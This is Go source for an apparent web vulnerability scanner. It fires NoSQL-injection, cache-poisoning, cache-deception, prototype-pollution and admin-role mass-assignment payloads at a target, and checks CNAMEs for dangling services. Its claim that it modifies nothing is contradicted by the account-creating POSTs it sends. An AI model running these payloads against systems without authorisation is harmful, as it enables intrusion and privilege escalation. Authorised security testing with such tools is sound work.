// attackscan — OMEGA multi-technique aggressive scanner (Go core).
//
// Input (JSON on stdin):
//   {"target":"http://host:port",
//    "cookie":"sess=...",            // optional, replayed on every request
//    "checks":["nosqli","cachepoison","cachedecep","protopoll","massassign"],
//    "paths":["/login","/api/login","/register","/api/users"], // optional
//    "cnames":["host.example"],      // optional, enables takeover check
//    "host":"vhost.example"}         // optional Host header override
//
// Checks (all differential / evidence-gated, stdlib only):
//   nosqli      — NoSQL operator injection ($ne/$regex) with an inert
//                 baseline POST; signal when a 200 JSON-ish response
//                 differs from baseline by >80 bytes.
//   cachepoison — X-Forwarded-Host reflection; HIGH candidate when the
//                 marker survives a second request WITHOUT the header
//                 (stored in cache), LOW when only reflected once.
//   cachedecep  — GET /<marker>.js with the replayed cookie; candidate
//                 when a non-JS 200 body containing account keywords
//                 comes back where the baseline .js 404s.
//   protopoll   — __proto__ / constructor.prototype injection across
//                 JSON body and query encodings; candidate when the
//                 injected key name is reflected back.
//   massassign  — registration/user-create bodies +role/isAdmin fields;
//                 candidate when status or body differs from baseline.
//   takeover    — for each cname: LookupCNAME; known dangling-service
//                 fingerprints + unreachable target -> HIGH candidate.
//
// Output (JSON on stdout):
//   {"results":[{"check","technique","severity","signal","evidence",
//                "detail","path"}]}
//
// Pure stdlib, concurrent (pool 8), per-request timeout 4s, evidence
// capped at 300 bytes. Nothing is deleted or modified on the target.

package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	workers       = 8
	reqTimeout    = 4 * time.Second
	snippetCap    = 300
	maxPerCheck   = 8 // paths per check
)

type input struct {
	Target string   `json:"target"`
	Cookie string   `json:"cookie"`
	Checks []string `json:"checks"`
	Paths  []string `json:"paths"`
	Cnames []string `json:"cnames"`
	Host   string   `json:"host"`
}

type entry struct {
	Check     string `json:"check"`
	Technique string `json:"technique"`
	Severity  string `json:"severity"`
	Signal    string `json:"signal"`
	Evidence  string `json:"evidence"`
	Detail    string `json:"detail"`
	Path      string `json:"path"`
}

var defaultPaths = []string{"/login", "/api/login", "/register",
	"/api/users", "/api/auth", "/signin"}

var knownFingerprints = []string{
	"github.io", "s3.amazonaws.com", "s3-website", "azurewebsites.net",
	"herokuapp.com", "cloudfront.net", "netlify.app", "surge.sh",
	"bitbucket.io", "gitlab.io", "fastly.net", "web.app",
	"firebaseapp.com", "ghost.io", "pantheon.io", "readme.io",
	"helpjuice.com", "intercom.help", "cargocollective.com",
}

var client = &http.Client{
	Timeout: reqTimeout,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse // never follow redirects
	},
}

func randMarker(prefix string) string {
	b := make([]byte, 6)
	_, _ = rand.Read(b)
	return prefix + hex.EncodeToString(b)
}

func req(method, url string, hdr map[string]string, body string) (int,
	string, string, string) {
	var rd io.Reader
	if body != "" {
		rd = bytes.NewBufferString(body)
	}
	r, err := http.NewRequest(method, url, rd)
	if err != nil {
		return 0, "", "", ""
	}
	for k, v := range hdr {
		r.Header.Set(k, v)
	}
	if body != "" && r.Header.Get("Content-Type") == "" {
		r.Header.Set("Content-Type",
			"application/x-www-form-urlencoded")
	}
	resp, err := client.Do(r)
	if err != nil {
		return 0, "", "", ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
	return resp.StatusCode, resp.Header.Get("Content-Type"),
		string(b), resp.Header.Get("X-Cache")
}

func capped(s string) string {
	if len(s) > snippetCap {
		return s[:snippetCap]
	}
	return s
}

func compactJSON(raw string) string {
	var buf bytes.Buffer
	var m map[string]interface{}
	if err := json.Unmarshal([]byte(raw), &m); err == nil {
		out, _ := json.Marshal(m)
		buf.Write(out)
		return buf.String()
	}
	return raw
}

// ---------------------------------------------------------------- nosqli
func checkNoSQLi(in input, out chan<- entry) {
	paths := in.Paths
	if len(paths) > maxPerCheck {
		paths = paths[:maxPerCheck]
	}
	ops := []struct {
		name string
		body string
	}{
		{"$ne-widening", `{"username":{"$ne":""},"password":{"$ne":""}}`},
		{"$regex-all", `{"username":{"$regex":".*"},"password":{"$regex":".*"}}`},
		{"$gt-empty", `{"username":{"$gt":""},"password":{"$gt":""}}`},
	}
	for _, p := range paths {
		u := strings.TrimRight(in.Target, "/") + p
		hdr := map[string]string{"Content-Type": "application/json"}
		if in.Cookie != "" {
			hdr["Cookie"] = in.Cookie
		}
		st0, _, b0, _ := req("POST", u, hdr,
			`{"username":"omegansq","password":"omegansq"}`)
		if st0 == 0 {
			continue
		}
		for _, op := range ops {
			st, _, b, _ := req("POST", u, hdr, op.body)
			if st == 200 && len(compactJSON(b))-len(compactJSON(b0)) > 80 {
				out <- entry{
					Check: "nosqli", Technique: op.name,
					Severity: "high", Signal: "differential",
					Evidence: capped(b),
					Detail: fmt.Sprintf(
						"operator body changed the JSON response by %d bytes vs inert baseline (status %d)",
						len(compactJSON(b))-len(compactJSON(b0)), st),
					Path: p,
				}
			}
			// GET query variant
			gu := u + "?user[$ne]=&pass[$ne]=&username[$regex]=.*"
			hdrG := map[string]string{}
			if in.Cookie != "" {
				hdrG["Cookie"] = in.Cookie
			}
			stG, _, bG, _ := req("GET", gu, hdrG, "")
			if stG == 200 && st == 0 && len(bG) != len(b0) {
				out <- entry{
					Check: "nosqli", Technique: op.name + "-query",
					Severity: "medium", Signal: "differential",
					Evidence: capped(bG),
					Detail:   "query-operator variant changed the response",
					Path:     p,
				}
			}
		}
	}
}

// ----------------------------------------------------------- cachepoison
func checkCachePoison(in input, out chan<- entry) {
	marker := randMarker("omegapzn-")
	for _, p := range []string{"/", "/resources", "/styles"} {
		if len(in.Paths) > 0 {
			p = in.Paths[0]
		}
		u := strings.TrimRight(in.Target, "/") + p + "?omegacp=" + marker
		hdr := map[string]string{"X-Forwarded-Host": marker + ".example"}
		if in.Cookie != "" {
			hdr["Cookie"] = in.Cookie
		}
		st, _, b, xcache := req("GET", u, hdr, "")
		if st == 0 || !strings.Contains(b, marker+".example") {
			continue
		}
		// second request WITHOUT the poison header
		hdr2 := map[string]string{}
		if in.Cookie != "" {
			hdr2["Cookie"] = in.Cookie
		}
		_, _, b2, _ := req("GET", u, hdr2, "")
		if strings.Contains(b2, marker+".example") {
			out <- entry{
				Check: "cachepoison", Technique: "xff-host-store",
				Severity: "high", Signal: "cache-stored",
				Evidence: capped(b2),
				Detail: fmt.Sprintf(
					"X-Forwarded-Host reflection persisted across a clean request (X-Cache=%q) — cache poisoning candidate",
					xcache),
				Path: p,
			}
		} else {
			out <- entry{
				Check: "cachepoison", Technique: "xff-host-reflect",
				Severity: "low", Signal: "header-reflection",
				Evidence: capped(b),
				Detail:   "unkeyed header reflected once (no cache store observed)",
				Path:     p,
			}
		}
	}
}

// ----------------------------------------------------------- cachedecep
func checkCacheDeception(in input, out chan<- entry) {
	if in.Cookie == "" {
		return // no session -> nothing to steal
	}
	words := []string{"logout", "account", "profile", "dashboard",
		"settings", "my-orders", "billing"}
	for _, w := range words[:3] {
		marker := randMarker("omegacdep-")
		u := strings.TrimRight(in.Target, "/") + "/" + marker + "-" +
			w + ".js"
		st, ct, b, _ := req("GET", u,
			map[string]string{"Cookie": in.Cookie}, "")
		if st != 200 || strings.Contains(ct, "javascript") {
			continue
		}
		low := strings.ToLower(b)
		if strings.Contains(low, "logout") ||
			strings.Contains(low, "account") ||
			strings.Contains(low, "dashboard") ||
			strings.Contains(low, "profile") {
			out <- entry{
				Check: "cachedecep", Technique: "path-confusion",
				Severity: "high", Signal: "auth-page-as-js",
				Evidence: capped(b),
				Detail: fmt.Sprintf(
					"GET /%s-%s.js returned 200 %q with authenticated-page keywords — cache deception candidate (ensure the cache never stores this)",
					marker, w, ct),
				Path: "/" + marker + "-" + w + ".js",
			}
		}
	}
}

// ----------------------------------------------------------- protopoll
func checkProtoPoll(in input, out chan<- entry) {
	marker := randMarker("omegapp-")
	cases := []struct {
		name, body, ctype, path string
	}{
		{"json-proto", fmt.Sprintf(`{"__proto__":{"%s":"yes"}}`,
			marker), "application/json", "/api/users"},
		{"json-constructor",
			fmt.Sprintf(`{"constructor":{"prototype":{"%s":"yes"}}}`,
				marker), "application/json", "/api/users"},
		{"form-bracket", "", "application/x-www-form-urlencoded",
			"/register"},
	}
	for _, c := range cases {
		u := strings.TrimRight(in.Target, "/") + c.path
		body := c.body
		if c.ctype != "application/json" {
			v := url.Values{}
			v.Set("__proto__["+marker+"]", "yes")
			v.Set("constructor[prototype]["+marker+"]", "yes")
			v.Set("username", "omegappu")
			v.Set("password", "omegapp")
			body = v.Encode()
		}
		hdr := map[string]string{"Content-Type": c.ctype}
		if in.Cookie != "" {
			hdr["Cookie"] = in.Cookie
		}
		st, _, b, _ := req("POST", u, hdr, body)
		if st == 0 {
			continue
		}
		if strings.Contains(b, marker) {
			out <- entry{
				Check: "protopoll", Technique: c.name,
				Severity: "medium", Signal: "key-reflected",
				Evidence: capped(b),
				Detail: fmt.Sprintf(
					"pollution key %s echoed back by the server (status %d) — prototype pollution candidate, verify gadget impact manually",
					marker, st),
				Path: c.path,
			}
		}
	}
}

// ----------------------------------------------------------- massassign
func checkMassAssign(in input, out chan<- entry) {
	paths := []string{"/api/users", "/register"}
	if len(in.Paths) > 2 {
		paths = in.Paths[:2]
	}
	for _, p := range paths {
		u := strings.TrimRight(in.Target, "/") + p
		base := url.Values{}
		base.Set("username", "omegausr")
		base.Set("password", "omegapw")
		base.Set("email", "omegausr@example.tld")
		priv := url.Values{}
		for k, v := range base {
			priv[k] = v
		}
		priv.Set("role", "admin")
		priv.Set("isAdmin", "true")
		priv.Set("is_admin", "1")
		priv.Set("role_id", "1")
		hdr := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded"}
		if in.Cookie != "" {
			hdr["Cookie"] = in.Cookie
		}
		st0, _, b0, _ := req("POST", u, hdr, base.Encode())
		st1, _, b1, _ := req("POST", u, hdr, priv.Encode())
		if st0 == 0 || st1 == 0 {
			continue
		}
		if (st1 != st0) || len(compactJSON(b1))-len(compactJSON(b0)) > 40 {
			out <- entry{
				Check: "massassign", Technique: "privilege-fields",
				Severity: "high", Signal: "differential",
				Evidence: capped(b1),
				Detail: fmt.Sprintf(
					"adding role/isAdmin/role_id fields changed the response (status %d -> %d, length delta %d) — mass assignment candidate",
					st0, st1,
					len(compactJSON(b1))-len(compactJSON(b0))),
				Path: p,
			}
		}
	}
}

// ------------------------------------------------------------- takeover
func checkTakeover(in input, out chan<- entry) {
	for _, host := range in.Cnames {
		if host == "" {
			continue
		}
		cname, err := net.LookupCNAME(host)
		if err != nil || cname == "" || cname == host+"." {
			continue // no CNAME -> not takeover material
		}
		cname = strings.TrimSuffix(cname, ".")
		fp := ""
		for _, f := range knownFingerprints {
			if strings.HasSuffix(cname, f) {
				fp = f
				break
			}
		}
		if fp == "" {
			continue
		}
		scheme := "https"
		if strings.Contains(host, "http://") {
			scheme = "http"
		}
		st, _, _, _ := req("GET", scheme+"://"+cname, nil, "")
		if st == 0 || st == 404 || st == 400 {
			out <- entry{
				Check: "takeover", Technique: "dangling-cname",
				Severity: "high", Signal: "dangling-service",
				Evidence: fmt.Sprintf("CNAME %s -> %s (%s), probe status %d",
					host, cname, fp, st),
				Detail: "CNAME points at a known service " + fp +
					" that no longer serves the name — takeover candidate, verify claim manually",
				Path: host,
			}
		}
	}
}

// ------------------------------------------------------------------ main
func main() {
	in, err := decodeInput()
	if err != nil {
		emit(map[string]interface{}{"error": err.Error()})
		return
	}
	out := make(chan entry, 256)
	var wg sync.WaitGroup
	want := map[string]bool{}
	for _, c := range in.Checks {
		want[c] = true
	}
	if len(want) == 0 {
		for _, c := range []string{"nosqli", "cachepoison",
			"cachedecep", "protopoll", "massassign"} {
			want[c] = true
		}
	}
	run := func(name string, fn func(input, chan<- entry)) {
		if !want[name] {
			return
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			fn(in, out)
		}()
	}
	run("nosqli", checkNoSQLi)
	run("cachepoison", checkCachePoison)
	run("cachedecep", checkCacheDeception)
	run("protopoll", checkProtoPoll)
	run("massassign", checkMassAssign)
	run("takeover", checkTakeover)
	done := make(chan []entry)
	go func() {
		var res []entry
		wg.Wait()
		close(out)
		for e := range out {
			res = append(res, e)
		}
		done <- res
	}()
	select {
	case res := <-done:
		if res == nil {
			res = []entry{}
		}
		emit(map[string]interface{}{"results": res})
	case <-time.After(120 * time.Second):
		emit(map[string]interface{}{
			"error": "global timeout", "results": []entry{}})
	}
}

func decodeInput() (input, error) {
	var in input
	r := bufio.NewReader(os.Stdin)
	raw, err := io.ReadAll(io.LimitReader(r, 1<<20))
	if err != nil {
		return in, err
	}
	if err := json.Unmarshal(raw, &in); err != nil {
		return in, err
	}
	if in.Target == "" {
		return in, fmt.Errorf("target required")
	}
	if !strings.HasPrefix(in.Target, "http") {
		in.Target = "http://" + in.Target
	}
	return in, nil
}

func emit(v map[string]interface{}) {
	out, _ := json.Marshal(v)
	os.Stdout.Write(out)
}
